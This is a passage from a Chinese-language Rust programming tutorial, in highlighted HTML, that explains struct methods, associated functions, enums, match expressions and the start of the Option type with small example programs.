</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#note-cs-rust-rust-__codelineno-76-3"></a><span class="w">    </span><span class="n">height</span>: <span class="kt">u32</span><span class="p">,</span>
</span><span id="__span-76-4"><a id="__codelineno-76-4" name="__codelineno-76-4" href="#note-cs-rust-rust-__codelineno-76-4"></a><span class="p">}</span>
</span></code></pre></div></li>
<li>
<p>这段代码定义了一个结构体<code>Rectangle</code>，它有两个字段：<code>width</code>（宽度）和<code>height</code>（高度），都是<code>u32</code>类型的无符号32位整数。</p>
</li>
<li>
<p><code>impl Rectangle</code>块
<div class="language-rust highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#note-cs-rust-rust-__codelineno-77-1"></a><span class="k">impl</span><span class="w"> </span><span class="n">Rectangle</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#note-cs-rust-rust-__codelineno-77-2"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">area</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">u32</span> <span class="p">{</span>
</span><span id="__span-77-3"><a id="__codelineno-77-3" name="__codelineno-77-3" href="#note-cs-rust-rust-__codelineno-77-3"></a><span class="w">        </span><span class="bp">self</span><span class="p">.</span><span class="n">width</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">height</span>
</span><span id="__span-77-4"><a id="__codelineno-77-4" name="__codelineno-77-4" href="#note-cs-rust-rust-__codelineno-77-4"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-77-5"><a id="__codelineno-77-5" name="__codelineno-77-5" href="#note-cs-rust-rust-__codelineno-77-5"></a>
</span><span id="__span-77-6"><a id="__codelineno-77-6" name="__codelineno-77-6" href="#note-cs-rust-rust-__codelineno-77-6"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">wider</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">,</span><span class="w"> </span><span class="n">rect</span>: <span class="kp">&amp;</span><span class="nc">Rectangle</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">bool</span> <span class="p">{</span>
</span><span id="__span-77-7"><a id="__codelineno-77-7" name="__codelineno-77-7" href="#note-cs-rust-rust-__codelineno-77-7"></a><span class="w">        </span><span class="bp">self</span><span class="p">.</span><span class="n">width</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">rect</span><span class="p">.</span><span class="n">width</span>
</span><span id="__span-77-8"><a id="__codelineno-77-8" name="__codelineno-77-8" href="#note-cs-rust-rust-__codelineno-77-8"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-77-9"><a id="__codelineno-77-9" name="__codelineno-77-9" href="#note-cs-rust-rust-__codelineno-77-9"></a><span class="p">}</span>
</span></code></pre></div></p>
</li>
<li>
<p><code>impl Rectangle</code>块定义了两个方法，<code>area</code>和<code>wider</code>，它们都属于<code>Rectangle</code>结构体。</p>
</li>
<li>
<p><code>area</code>方法：</p>
<ul>
<li><code>fn area(&amp;self) -&gt; u32</code> 定义了一个计算矩形面积的方法。</li>
<li><code>self</code>是一个指向调用该方法的矩形实例的引用。</li>
<li><code>self.width * self.height</code>计算并返回矩形的面积。</li>
</ul>
</li>
<li>
<p><code>wider</code>方法：</p>
<ul>
<li><code>fn wider(&amp;self, rect: &amp;Rectangle) -&gt; bool</code>定义了一个比较矩形宽度的方法。</li>
<li>这个方法接收两个参数：<code>self</code>表示调用该方法的矩形，<code>rect</code>是另一个用于比较的矩形。</li>
<li><code>self.width &gt; rect.width</code> 判断调用<code>wider</code>方法的矩形是否比传入的矩形更宽，返回一个布尔值。</li>
</ul>
</li>
<li>
<p><code>main</code>函数
<div class="language-rust highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#note-cs-rust-rust-__codelineno-78-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-78-2"><a id="__codelineno-78-2" name="__codelineno-78-2" href="#note-cs-rust-rust-__codelineno-78-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">rect1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Rectangle</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">width</span>: <span class="mi">30</span><span class="p">,</span><span class="w"> </span><span class="n">height</span>: <span class="mi">50</span><span class="w"> </span><span class="p">};</span>
</span><span id="__span-78-3"><a id="__codelineno-78-3" name="__codelineno-78-3" href="#note-cs-rust-rust-__codelineno-78-3"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">rect2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Rectangle</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">width</span>: <span class="mi">40</span><span class="p">,</span><span class="w"> </span><span class="n">height</span>: <span class="mi">20</span><span class="w"> </span><span class="p">};</span>
</span><span id="__span-78-4"><a id="__codelineno-78-4" name="__codelineno-78-4" href="#note-cs-rust-rust-__codelineno-78-4"></a>
</span><span id="__span-78-5"><a id="__codelineno-78-5" name="__codelineno-78-5" href="#note-cs-rust-rust-__codelineno-78-5"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">rect1</span><span class="p">.</span><span class="n">wider</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rect2</span><span class="p">));</span>
</span><span id="__span-78-6"><a id="__codelineno-78-6" name="__codelineno-78-6" href="#note-cs-rust-rust-__codelineno-78-6"></a><span class="p">}</span>
</span></code></pre></div></p>
</li>
<li>
<p><code>main</code>函数是程序的入口点。</p>
</li>
<li>
<p><code>let rect1 = Rectangle { width: 30, height: 50 };</code> 创建一个宽度为30、高度为50的矩形实例<code>rect1</code>。</p>
</li>
<li>
<p><code>let rect2 = Rectangle { width: 40, height: 20 };</code> 创建另一个宽度为40、高度为20的矩形实例<code>rect2</code>。</p>
</li>
<li>
<p><code>println!("{}", rect1.wider(&amp;rect2));</code> 调用<code>rect1</code>的<code>wider</code>方法，比较它和<code>rect2</code>的宽度，然后将结果打印出来。</p>
</li>
</ol>
<p>运行结果</p>
<ul>
<li><code>rect1.wider(&amp;rect2)</code>会返回<code>false</code>，因为<code>rect1</code>的宽度（30）小于<code>rect2</code>的宽度（40）。</li>
<li>程序将打印出<code>false</code>。</li>
</ul>
</details>
<h4 id="note-cs-rust-rust-_34">结构体关联函数<a class="headerlink" href="#note-cs-rust-rust-_34" title="Permanent link">&para;</a></h4>
<p>之所以"结构体方法"不叫"结构体函数"是因为"函数"这个名字留给了这种函数：它在 impl 块中却没有 &amp;self 参数。</p>
<p>这种函数不依赖实例，但是使用它需要声明是在哪个 impl 块中的。</p>
<p>一直使用的 String::from 函数就是一个"关联函数"。</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#note-cs-rust-rust-__codelineno-79-1"></a><span class="cp">#[derive(Debug)]</span>
</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#note-cs-rust-rust-__codelineno-79-2"></a><span class="k">struct</span> <span class="nc">Rectangle</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-79-3"><a id="__codelineno-79-3" name="__codelineno-79-3" href="#note-cs-rust-rust-__codelineno-79-3"></a><span class="w">    </span><span class="n">width</span>: <span class="kt">u32</span><span class="p">,</span>
</span><span id="__span-79-4"><a id="__codelineno-79-4" name="__codelineno-79-4" href="#note-cs-rust-rust-__codelineno-79-4"></a><span class="w">    </span><span class="n">height</span>: <span class="kt">u32</span><span class="p">,</span>
</span><span id="__span-79-5"><a id="__codelineno-79-5" name="__codelineno-79-5" href="#note-cs-rust-rust-__codelineno-79-5"></a><span class="p">}</span>
</span><span id="__span-79-6"><a id="__codelineno-79-6" name="__codelineno-79-6" href="#note-cs-rust-rust-__codelineno-79-6"></a>
</span><span id="__span-79-7"><a id="__codelineno-79-7" name="__codelineno-79-7" href="#note-cs-rust-rust-__codelineno-79-7"></a><span class="k">impl</span><span class="w"> </span><span class="n">Rectangle</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-79-8"><a id="__codelineno-79-8" name="__codelineno-79-8" href="#note-cs-rust-rust-__codelineno-79-8"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">create</span><span class="p">(</span><span class="n">width</span>: <span class="kt">u32</span><span class="p">,</span><span class="w"> </span><span class="n">height</span>: <span class="kt">u32</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nc">Rectangle</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-79-9"><a id="__codelineno-79-9" name="__codelineno-79-9" href="#note-cs-rust-rust-__codelineno-79-9"></a><span class="w">        </span><span class="n">Rectangle</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">width</span><span class="p">,</span><span class="w"> </span><span class="n">height</span><span class="w"> </span><span class="p">}</span>
</span><span id="__span-79-10"><a id="__codelineno-79-10" name="__codelineno-79-10" href="#note-cs-rust-rust-__codelineno-79-10"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-79-11"><a id="__codelineno-79-11" name="__codelineno-79-11" href="#note-cs-rust-rust-__codelineno-79-11"></a><span class="p">}</span>
</span><span id="__span-79-12"><a id="__codelineno-79-12" name="__codelineno-79-12" href="#note-cs-rust-rust-__codelineno-79-12"></a>
</span><span id="__span-79-13"><a id="__codelineno-79-13" name="__codelineno-79-13" href="#note-cs-rust-rust-__codelineno-79-13"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-79-14"><a id="__codelineno-79-14" name="__codelineno-79-14" href="#note-cs-rust-rust-__codelineno-79-14"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">rect</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Rectangle</span>::<span class="n">create</span><span class="p">(</span><span class="mi">30</span><span class="p">,</span><span class="w"> </span><span class="mi">50</span><span class="p">);</span>
</span><span id="__span-79-15"><a id="__codelineno-79-15" name="__codelineno-79-15" href="#note-cs-rust-rust-__codelineno-79-15"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">rect</span><span class="p">);</span>
</span><span id="__span-79-16"><a id="__codelineno-79-16" name="__codelineno-79-16" href="#note-cs-rust-rust-__codelineno-79-16"></a><span class="p">}</span>
</span></code></pre></div>
<div class="admonition note">
<p class="admonition-title">Note</p>
<p>结构体 impl 块可以写几次，效果相当于它们内容的拼接！</p>
<p>结构体可以只作为一种象征而无需任何成员：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#note-cs-rust-rust-__codelineno-80-1"></a><span class="k">struct</span> <span class="nc">UnitStruct</span><span class="p">;</span>
</span></code></pre></div></p>
<p>我们称这种没有身体的结构体为单元结构体（Unit Struct）。</p>
</div>
<h2 id="note-cs-rust-rust-_35">枚举类<a class="headerlink" href="#note-cs-rust-rust-_35" title="Permanent link">&para;</a></h2>
<p>RUST中的枚举类可以比较简单地使用
格式为
<div class="language-rust highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#note-cs-rust-rust-__codelineno-81-1"></a><span class="k">enum</span> <span class="err">枚举类名称</span>
</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#note-cs-rust-rust-__codelineno-81-2"></a><span class="p">{</span>
</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#note-cs-rust-rust-__codelineno-81-3"></a><span class="w">   </span><span class="err">成员</span><span class="mi">1</span><span class="p">,</span>
</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#note-cs-rust-rust-__codelineno-81-4"></a><span class="w">   </span><span class="err">成员</span><span class="mi">2</span><span class="p">,</span>
</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#note-cs-rust-rust-__codelineno-81-5"></a><span class="w">   </span><span class="o">..</span><span class="p">.</span>
</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6" href="#note-cs-rust-rust-__codelineno-81-6"></a><span class="w">   </span><span class="err">最后一个成员</span>
</span><span id="__span-81-7"><a id="__codelineno-81-7" name="__codelineno-81-7" href="#note-cs-rust-rust-__codelineno-81-7"></a><span class="p">}</span>
</span></code></pre></div>
例如
<div class="language-rust highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#note-cs-rust-rust-__codelineno-82-1"></a><span class="cp">#[derive(Debug)]</span>
</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#note-cs-rust-rust-__codelineno-82-2"></a>
</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#note-cs-rust-rust-__codelineno-82-3"></a><span class="k">enum</span> <span class="nc">Book</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#note-cs-rust-rust-__codelineno-82-4"></a><span class="w">    </span><span class="n">Papery</span><span class="p">,</span><span class="w"> </span><span class="n">Electronic</span>
</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#note-cs-rust-rust-__codelineno-82-5"></a><span class="p">}</span>
</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6" href="#note-cs-rust-rust-__codelineno-82-6"></a>
</span><span id="__span-82-7"><a id="__codelineno-82-7" name="__codelineno-82-7" href="#note-cs-rust-rust-__codelineno-82-7"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-82-8"><a id="__codelineno-82-8" name="__codelineno-82-8" href="#note-cs-rust-rust-__codelineno-82-8"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">book</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Book</span>::<span class="n">Papery</span><span class="p">;</span>
</span><span id="__span-82-9"><a id="__codelineno-82-9" name="__codelineno-82-9" href="#note-cs-rust-rust-__codelineno-82-9"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">book</span><span class="p">);</span>
</span><span id="__span-82-10"><a id="__codelineno-82-10" name="__codelineno-82-10" href="#note-cs-rust-rust-__codelineno-82-10"></a><span class="p">}</span>
</span></code></pre></div>
这段程序会输出Papery</p>
<p>如果你正在开发一个图书管理系统，你需要描述书的两种不同的属性(纸质书有索引号，电子书有URL)，那么可以为枚举类的成员添加元组属性描述,如果要为属性命名,可以用结构体的语法</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-83-1"><a id="__codelineno-83-1" name="__codelineno-83-1" href="#note-cs-rust-rust-__codelineno-83-1"></a><span class="k">enum</span> <span class="nc">Book</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-83-2"><a id="__codelineno-83-2" name="__codelineno-83-2" href="#note-cs-rust-rust-__codelineno-83-2"></a><span class="w">    </span><span class="n">Papery</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">index</span>: <span class="kt">u32</span> <span class="p">},</span>
</span><span id="__span-83-3"><a id="__codelineno-83-3" name="__codelineno-83-3" href="#note-cs-rust-rust-__codelineno-83-3"></a><span class="w">    </span><span class="n">Electronic</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">url</span>: <span class="nb">String</span> <span class="p">},</span>
</span><span id="__span-83-4"><a id="__codelineno-83-4" name="__codelineno-83-4" href="#note-cs-rust-rust-__codelineno-83-4"></a><span class="p">}</span>
</span><span id="__span-83-5"><a id="__codelineno-83-5" name="__codelineno-83-5" href="#note-cs-rust-rust-__codelineno-83-5"></a><span class="kd">let</span><span class="w"> </span><span class="n">book</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Book</span>::<span class="n">Papery</span><span class="p">{</span><span class="n">index</span>: <span class="mi">1001</span><span class="p">};</span>
</span></code></pre></div>
虽然可以如此命名，但请注意，并不能像访问结构体字段一样访问枚举类绑定的属性。访问的方法在 match 语法中。</p>
<div class="admonition match语法">
<p class="admonition-title">Match语法</p>
<p>枚举的目的是对某一类事物的分类，分类的目的是为了对不同的情况进行描述。基于这个原理，往往枚举类最终都会被分支结构处理（许多语言中的 switch ）。 switch 语法很经典，但在 Rust 中并不支持，很多语言摒弃 switch 的原因都是因为 switch 容易存在因忘记添加 break 而产生的串接运行问题，Java 和 C# 这类语言通过安全检查杜绝这种情况出现。</p>
<p>Rust 通过 match 语句来实现分支结构。
<div class="language-rust highlight"><pre><span></span><code><span id="__span-84-1"><a id="__codelineno-84-1" name="__codelineno-84-1" href="#note-cs-rust-rust-__codelineno-84-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-84-2"><a id="__codelineno-84-2" name="__codelineno-84-2" href="#note-cs-rust-rust-__codelineno-84-2"></a><span class="k">enum</span> <span class="nc">Book</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-84-3"><a id="__codelineno-84-3" name="__codelineno-84-3" href="#note-cs-rust-rust-__codelineno-84-3"></a><span class="w">    </span><span class="n">Papery</span><span class="w"> </span><span class="p">{</span><span class="n">index</span>: <span class="kt">u32</span><span class="p">},</span>
</span><span id="__span-84-4"><a id="__codelineno-84-4" name="__codelineno-84-4" href="#note-cs-rust-rust-__codelineno-84-4"></a><span class="w">    </span><span class="n">Electronic</span><span class="w"> </span><span class="p">{</span><span class="n">url</span>: <span class="nb">String</span><span class="p">},</span>
</span><span id="__span-84-5"><a id="__codelineno-84-5" name="__codelineno-84-5" href="#note-cs-rust-rust-__codelineno-84-5"></a><span class="p">}</span>
</span><span id="__span-84-6"><a id="__codelineno-84-6" name="__codelineno-84-6" href="#note-cs-rust-rust-__codelineno-84-6"></a>
</span><span id="__span-84-7"><a id="__codelineno-84-7" name="__codelineno-84-7" href="#note-cs-rust-rust-__codelineno-84-7"></a><span class="kd">let</span><span class="w"> </span><span class="n">book</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Book</span>::<span class="n">Papery</span><span class="p">{</span><span class="n">index</span>: <span class="mi">1001</span><span class="p">};</span>
</span><span id="__span-84-8"><a id="__codelineno-84-8" name="__codelineno-84-8" href="#note-cs-rust-rust-__codelineno-84-8"></a><span class="kd">let</span><span class="w"> </span><span class="n">ebook</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Book</span>::<span class="n">Electronic</span><span class="p">{</span><span class="n">url</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;url...&quot;</span><span class="p">)};</span>
</span><span id="__span-84-9"><a id="__codelineno-84-9" name="__codelineno-84-9" href="#note-cs-rust-rust-__codelineno-84-9"></a>
</span><span id="__span-84-10"><a id="__codelineno-84-10" name="__codelineno-84-10" href="#note-cs-rust-rust-__codelineno-84-10"></a><span class="k">match</span><span class="w"> </span><span class="n">book</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-84-11"><a id="__codelineno-84-11" name="__codelineno-84-11" href="#note-cs-rust-rust-__codelineno-84-11"></a><span class="w">    </span><span class="n">Book</span>::<span class="n">Papery</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">index</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-84-12"><a id="__codelineno-84-12" name="__codelineno-84-12" href="#note-cs-rust-rust-__codelineno-84-12"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Papery book {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">index</span><span class="p">);</span>
</span><span id="__span-84-13"><a id="__codelineno-84-13" name="__codelineno-84-13" href="#note-cs-rust-rust-__codelineno-84-13"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-84-14"><a id="__codelineno-84-14" name="__codelineno-84-14" href="#note-cs-rust-rust-__codelineno-84-14"></a><span class="w">    </span><span class="n">Book</span>::<span class="n">Electronic</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-84-15"><a id="__codelineno-84-15" name="__codelineno-84-15" href="#note-cs-rust-rust-__codelineno-84-15"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;E-book {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">);</span>
</span><span id="__span-84-16"><a id="__codelineno-84-16" name="__codelineno-84-16" href="#note-cs-rust-rust-__codelineno-84-16"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-84-17"><a id="__codelineno-84-17" name="__codelineno-84-17" href="#note-cs-rust-rust-__codelineno-84-17"></a><span class="p">}</span>
</span><span id="__span-84-18"><a id="__codelineno-84-18" name="__codelineno-84-18" href="#note-cs-rust-rust-__codelineno-84-18"></a><span class="p">}</span>
</span></code></pre></div>
运行结果为 Papery book 1001</p>
<p>match 块也可以当作函数表达式来对待，它也是可以有返回值的</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-85-1"><a id="__codelineno-85-1" name="__codelineno-85-1" href="#note-cs-rust-rust-__codelineno-85-1"></a><span class="k">match</span><span class="w"> </span><span class="err">枚举类实例</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-85-2"><a id="__codelineno-85-2" name="__codelineno-85-2" href="#note-cs-rust-rust-__codelineno-85-2"></a><span class="err">分类</span><span class="mi">1</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">返回值表达式</span><span class="p">,</span>
</span><span id="__span-85-3"><a id="__codelineno-85-3" name="__codelineno-85-3" href="#note-cs-rust-rust-__codelineno-85-3"></a><span class="err">分类</span><span class="mi">2</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">返回值表达式</span><span class="p">,</span>
</span><span id="__span-85-4"><a id="__codelineno-85-4" name="__codelineno-85-4" href="#note-cs-rust-rust-__codelineno-85-4"></a><span class="o">..</span><span class="p">.</span>
</span><span id="__span-85-5"><a id="__codelineno-85-5" name="__codelineno-85-5" href="#note-cs-rust-rust-__codelineno-85-5"></a><span class="p">}</span>
</span></code></pre></div>
<p>但是所有返回值表达式的类型必须一样！</p>
<p>如果把枚举类附加属性定义成元组，在 match 块中需要临时指定一个名字：</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-86-1"><a id="__codelineno-86-1" name="__codelineno-86-1" href="#note-cs-rust-rust-__codelineno-86-1"></a><span class="k">enum</span> <span class="nc">Book</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-86-2"><a id="__codelineno-86-2" name="__codelineno-86-2" href="#note-cs-rust-rust-__codelineno-86-2"></a><span class="n">Papery</span><span class="p">(</span><span class="kt">u32</span><span class="p">),</span>
</span><span id="__span-86-3"><a id="__codelineno-86-3" name="__codelineno-86-3" href="#note-cs-rust-rust-__codelineno-86-3"></a><span class="n">Electronic</span><span class="w"> </span><span class="p">{</span><span class="n">url</span>: <span class="nb">String</span><span class="p">},</span>
</span><span id="__span-86-4"><a id="__codelineno-86-4" name="__codelineno-86-4" href="#note-cs-rust-rust-__codelineno-86-4"></a><span class="p">}</span>
</span><span id="__span-86-5"><a id="__codelineno-86-5" name="__codelineno-86-5" href="#note-cs-rust-rust-__codelineno-86-5"></a><span class="kd">let</span><span class="w"> </span><span class="n">book</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Book</span>::<span class="n">Papery</span><span class="p">(</span><span class="mi">1001</span><span class="p">);</span>
</span><span id="__span-86-6"><a id="__codelineno-86-6" name="__codelineno-86-6" href="#note-cs-rust-rust-__codelineno-86-6"></a>
</span><span id="__span-86-7"><a id="__codelineno-86-7" name="__codelineno-86-7" href="#note-cs-rust-rust-__codelineno-86-7"></a><span class="k">match</span><span class="w"> </span><span class="n">book</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-86-8"><a id="__codelineno-86-8" name="__codelineno-86-8" href="#note-cs-rust-rust-__codelineno-86-8"></a><span class="w">    </span><span class="n">Book</span>::<span class="n">Papery</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-86-9"><a id="__codelineno-86-9" name="__codelineno-86-9" href="#note-cs-rust-rust-__codelineno-86-9"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">);</span>
</span><span id="__span-86-10"><a id="__codelineno-86-10" name="__codelineno-86-10" href="#note-cs-rust-rust-__codelineno-86-10"></a><span class="w">    </span><span class="p">},</span>
</span><span id="__span-86-11"><a id="__codelineno-86-11" name="__codelineno-86-11" href="#note-cs-rust-rust-__codelineno-86-11"></a><span class="w">    </span><span class="n">Book</span>::<span class="n">Electronic</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">url</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-86-12"><a id="__codelineno-86-12" name="__codelineno-86-12" href="#note-cs-rust-rust-__codelineno-86-12"></a><span class="w">        </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">url</span><span class="p">);</span>
</span><span id="__span-86-13"><a id="__codelineno-86-13" name="__codelineno-86-13" href="#note-cs-rust-rust-__codelineno-86-13"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-86-14"><a id="__codelineno-86-14" name="__codelineno-86-14" href="#note-cs-rust-rust-__codelineno-86-14"></a><span class="p">}</span>
</span></code></pre></div>
match 除了能够对枚举类进行分支选择以外，还可以对整数、浮点数、字符和字符串切片引用（&amp;str）类型的数据进行分支选择。其中，浮点数类型被分支选择虽然合法，但不推荐这样使用，因为精度问题可能会导致分支错误。</p>
<p>对非枚举类进行分支选择时必须注意处理例外情况，即使在例外情况下没有任何要做的事 . 例外情况用下划线 _ 表示：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-87-1"><a id="__codelineno-87-1" name="__codelineno-87-1" href="#note-cs-rust-rust-__codelineno-87-1"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-87-2"><a id="__codelineno-87-2" name="__codelineno-87-2" href="#note-cs-rust-rust-__codelineno-87-2"></a><span class="kd">let</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;abc&quot;</span><span class="p">;</span>
</span><span id="__span-87-3"><a id="__codelineno-87-3" name="__codelineno-87-3" href="#note-cs-rust-rust-__codelineno-87-3"></a><span class="k">match</span><span class="w"> </span><span class="n">t</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-87-4"><a id="__codelineno-87-4" name="__codelineno-87-4" href="#note-cs-rust-rust-__codelineno-87-4"></a><span class="w">    </span><span class="s">&quot;abc&quot;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;Yes&quot;</span><span class="p">),</span>
</span><span id="__span-87-5"><a id="__codelineno-87-5" name="__codelineno-87-5" href="#note-cs-rust-rust-__codelineno-87-5"></a><span class="w">    </span><span class="n">_</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="p">{},</span>
</span><span id="__span-87-6"><a id="__codelineno-87-6" name="__codelineno-87-6" href="#note-cs-rust-rust-__codelineno-87-6"></a><span class="p">}</span>
</span><span id="__span-87-7"><a id="__codelineno-87-7" name="__codelineno-87-7" href="#note-cs-rust-rust-__codelineno-87-7"></a><span class="p">}</span>
</span></code></pre></div>
</div>
<h3 id="note-cs-rust-rust-option">Option 枚举类<a class="headerlink" href="#note-cs-rust-rust-option" title="Permanent link">&para;</a></h3>
<p>Option 是 Rust 标准库中的枚举类，这个类用于填补 Rust 不支持 null 引用的空白。</p>
<blockquote>
<p>许多语言支持 null 的存在（C/C++、Java），这样很方便，但也制造了极大的问题，null 的发明者也承认这一点，"一个方便的想法造成累计 10 亿美元的损失"。</p>
<p>null 经常在开发者把一切都当作不是 null 的时候给予程序致命一击：毕竟只要出现一个这样的错误，程序的运行就要彻底终止。</p>
<p>为了解决这个问题，很多语言默认不允许 null，但在语言层面支持 null 的出现（常在类型前面用 ? 符号修饰）。</p>
<p>Java 默认支持 null，但可以通过 <a class="magiclink magiclink-github magiclink-mention" href="https://github.com/NotNull" title="GitHub User: NotNull">@NotNull</a> 注解限制出现 null，这是一种应付的办法。</p>
<p>Rust 在语言层面彻底不允许空值 null 的存在，但无奈null 可以高效地解决少量的问题，所以 Rust 引入了 Option 枚举类：</p>
</blockquote>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-88-1"><a id="__codelineno-88-1" name="__codelineno-88-1" href="#note-cs-rust-rust-__codelineno-88-1"></a><span class="k">enum</span> <span class="nb">Option</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
